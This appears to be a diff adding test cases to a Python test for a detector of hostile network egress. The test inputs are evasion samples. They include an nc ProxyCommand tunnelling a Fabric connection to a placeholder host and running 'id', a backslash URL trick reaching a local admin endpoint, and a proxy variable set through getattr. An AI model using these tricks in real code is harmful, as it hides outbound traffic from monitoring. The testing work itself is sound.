@@ -5389,6 +5389,21 @@ class TestEgressHostParsingAndTracking:
                 f"{{'sock': paramiko.ProxyCommand('nc {_H} 22')}}).run('id')",
                 id = "fabric_connect_kwargs_sock",
             ),
+            pytest.param(
+                "import httpx\nhttpx.get(r'http://\\@127.0.0.1:8000/admin')",
+                id = "backslash_read_as_userinfo_by_httpx",
+            ),
+            pytest.param(
+                "import paramiko\nfrom fabric import Connection\ncfg = {}\n"
+                f"cfg['sock'] = paramiko.ProxyCommand('nc {_H} 22')\n"
+                "Connection('pypi.org', connect_kwargs = cfg).run('id')",
+                id = "fabric_connect_kwargs_filled_later",
+            ),
+            pytest.param(
+                f"import os, requests\ngetattr(os, 'environ')['HTTPS_PROXY'] = 'http://{_H}:8080'\n"
+                "requests.get('https://pypi.org/')",
+                id = "environ_through_constant_getattr",
+            ),
         ],
     )
     def test_the_hostile_host_is_seen(self, code):
